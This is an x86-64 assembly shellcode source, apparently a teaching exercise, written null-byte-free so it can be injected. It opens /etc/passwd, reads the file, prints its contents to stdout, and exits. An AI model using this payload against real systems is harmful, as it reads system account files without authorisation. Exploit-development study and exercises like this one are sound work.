 #as shellcode.s -o shellcode.o
 #ld shellcode.o -o shellcode
# realizado por Javier Burgos
.global _start
_start:
#open
        movq $0x2fffffffffffffff,%rax  
        shr $60, %rax
        movq $0x6477737361702fff,%r12
        shr $8,%r12
        pushq %r12    
        movq $0x6374652fffffffff,%r11
        push %r11
        add $4,%rsp
        movq %rsp,%rdi
        xorq %rbx, %rbx
        movq %rbx, %rsi
        movq %rbx, %rdx
        syscall
        movq %rax,%r14
        movq $0x200fffffffffffff,%rsi
        shr  $52,%rsi
        sub %rsi,%rsp

loop:
    #read
        movq %rbx,%rax
        movq %r14,%rdi    
        movq %rsp,%rsi
        movq $0x200fffffffffffff,%rdx
        shr  $52,%rdx
        syscall
        movq %rax ,%r8
        cmp %rbx,%r8
        jle exit

    #print
        movq $0x1fffffffffffffff,%rax  
        shr $60, %rax
        movq $0x1fffffffffffffff,%rdi  
        shr $60, %rdi
        movq %rsp,%rsi
        movq %r8,%rdx
        syscall 

        jmp loop
exit:
        movq $0x3cffffffffffffff, %rax
        shr $56, %rax
        movq %rbx,%rdi
        syscall



